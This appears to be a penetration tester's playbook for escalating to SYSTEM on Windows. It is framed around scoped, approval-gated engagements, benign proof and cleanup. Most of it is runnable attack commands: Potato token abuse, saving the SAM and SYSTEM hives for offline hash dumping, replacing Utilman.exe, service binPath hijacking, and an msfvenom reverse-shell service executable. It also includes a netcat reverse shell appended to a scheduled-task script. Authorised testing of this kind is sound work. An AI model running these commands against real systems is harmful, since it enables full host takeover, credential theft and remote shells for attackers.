# Windows privilege-escalation playbook
# In-scope host, approval-gated, BENIGN proof (whoami=nt authority\system), ALWAYS clean up. Lowest-risk first.
# Enumeration first — see refs/enumeration.md (winPEAS + whoami /all). This file turns a found vector into benign SYSTEM.
## Vector picker (lowest-risk → highest-risk)
1. token privilege (SeImpersonate/SeBackup/SeTakeOwnership)  2. saved creds / runas  3. weak service perms/DACL
4. unquoted service path  5. AlwaysInstallElevated  6. scheduled-task / autorun hijack  7. DLL hijack
8. kernel/patch CVE (HIGH RISK — last resort)

Always prove with `whoami` (= `nt authority\system`) + ONE benign command, back up anything you replace,
record every change in `cleanup.md`, and restore.

═══════════════════════════════════════════════════════════════════════════
## 1. Token privileges (whoami /priv)  — usually the fastest, safest win
═══════════════════════════════════════════════════════════════════════════
- **SeImpersonate / SeAssignPrimaryToken** (common on IIS/MSSQL/service accounts) → a "Potato" to SYSTEM:
  ```
  PrintSpoofer.exe -i -c "cmd /c whoami"      # benign proof as SYSTEM
  GodPotato -cmd "cmd /c whoami"              # modern, works where JuicyPotato doesn't
  # JuicyPotatoNG / RoguePotato for older builds. Prove id; do NOT drop persistence.
  ```
- **SeBackupPrivilege** → read protected files (SAM/SYSTEM) without being admin:
  ```
  reg save hklm\sam  C:\Windows\Temp\sam  &  reg save hklm\system C:\Windows\Temp\system
  # offline: secretsdump.py -sam sam -system system LOCAL   (feasibility proof; then psexec -hashes ...)
  ```
- **SeTakeOwnership** → own a SYSTEM binary and swap an accessibility tool (utilman):
  ```
  takeown /f C:\Windows\System32\Utilman.exe
  icacls C:\Windows\System32\Utilman.exe /grant <me>:F
  copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe   # BACK UP the original first!
  # at the lock screen press Win+U -> SYSTEM cmd. RESTORE Utilman.exe immediately after proof.
  ```
- **SeRestore** → write to protected locations (hijack a service binary / image-hijack). **SeDebug** → open
  lsass (feasibility only; avoid dumping). Each is a one-step win — exhaust these before any exploit.

═══════════════════════════════════════════════════════════════════════════
## 2. Saved credentials / runas
═══════════════════════════════════════════════════════════════════════════
```
cmdkey /list                                   # stored creds present?
runas /savecred /user:<DOMAIN\admin> "cmd /c whoami"    # reuse without knowing the password
# also: autologon DefaultPassword (reg), Unattend.xml, web.config connectionString, PuTTY proxy, PS history
```

═══════════════════════════════════════════════════════════════════════════
## 3. Weak service permissions / DACL
═══════════════════════════════════════════════════════════════════════════
- **Reconfigure a service you can change** (SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS):
  ```
  accesschk.exe -accepteula -uwcqv "Users" <svc>     # BUILTIN\Users : SERVICE_ALL_ACCESS ?
  sc qc <svc>                                         # current binPath + 'obj' (run-as) account
  sc config <svc> binPath= "C:\Windows\Temp\rev.exe" obj= LocalSystem     # (keep original to restore)
  sc stop <svc> & sc start <svc>                      # runs your benign exe as SYSTEM; then RESTORE binPath
  ```
- **Writable service EXE** (`icacls <svc>.exe` shows your group `(M)`/`(F)`): back up the original, drop a
  benign marker exe, `sc stop/start`, confirm, RESTORE the original binary.
- **Service payload** (benign reverse/marker as a *service* exe so SCM doesn't kill it):
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe-service -o rev.exe
  ```

═══════════════════════════════════════════════════════════════════════════
## 4. Unquoted service path
═══════════════════════════════════════════════════════════════════════════
A service path with spaces and no quotes (`C:\Program Files\My App\svc.exe`) lets Windows try
`C:\Program.exe`, `C:\Program Files\My.exe`, … — if you can write an earlier segment, you win.
```
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | select Name,PathName
icacls "C:\Program Files\My App"                      # writable (Users:(WD)/(M)) earlier segment?
# drop a benign exe at the hijack point, e.g. C:\Program Files\My.exe ; icacls it /grant Everyone:F
sc stop <svc> & sc start <svc>                        # confirm whoami=SYSTEM ; REMOVE the planted exe
```

═══════════════════════════════════════════════════════════════════════════
## 5. AlwaysInstallElevated
═══════════════════════════════════════════════════════════════════════════
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # =1 ?
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # =1 (BOTH required)
msfvenom -p windows/x64/exec CMD='cmd /c whoami > C:\Windows\Temp\pe.txt' -f msi -o m.msi   # benign
msiexec /quiet /qn /i m.msi                          # runs as SYSTEM; read pe.txt; uninstall + delete m.msi
```

═══════════════════════════════════════════════════════════════════════════
## 6. Scheduled task / autorun hijack
═══════════════════════════════════════════════════════════════════════════
```
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"   # a task Run As SYSTEM
icacls "C:\path\to\task-script.bat"                  # writable by you?
echo C:\Tools\nc64.exe -e cmd.exe <ip> 4444 >> <writable-task-script>   # benign marker preferred; BACK UP
schtasks /run /tn "<TaskName>"                       # confirm, then RESTORE the script
```
Same idea for writable autorun entries (`HKLM\...\Run`) and writable Startup folder items.

═══════════════════════════════════════════════════════════════════════════
## 7. DLL hijack / 8. Kernel — HIGH RISK, LAST RESORT
═══════════════════════════════════════════════════════════════════════════
- **DLL hijack:** a service/app loads a missing DLL from a writable dir on its search path → drop a benign
  proxy DLL, trigger a load, confirm, REMOVE. (Find with ProcMon "NAME NOT FOUND" on `.dll`.)
- **Kernel/patch CVE:** `wes.py systeminfo.txt` (offline) or winPEAS. A kernel exploit can **crash prod** —
  on a live host REPORT FEASIBILITY and run only in an approved window. Recognise: PrintNightmare
  (CVE-2021-1675/34527), HiveNightmare/SeriousSAM (CVE-2021-36934, readable SAM), SMBGhost, and the AD
  quick-wins (Zerologon, noPac) which belong to the ad-* skills.

═══════════════════════════════════════════════════════════════════════════
## Proof + cleanup  (every run)
═══════════════════════════════════════════════════════════════════════════
- Prove: `whoami` = `nt authority\system` (or a new admin) + ONE benign command. No more.
- `cleanup.md` lists EVERYTHING created/changed: dropped tools (`wp.exe`, potato exes, `m.msi`, `rev.exe`),
  service binPath/DACL edits (with original restored), replaced binaries (Utilman, service exe — originals
  backed up + restored), registry/task edits, saved SAM/SYSTEM copies (delete them) — each confirmed reverted.
- NO persistence, NO backdoors, NO destruction, NO bulk credential dumping beyond proving the vector.
  In-scope host only.
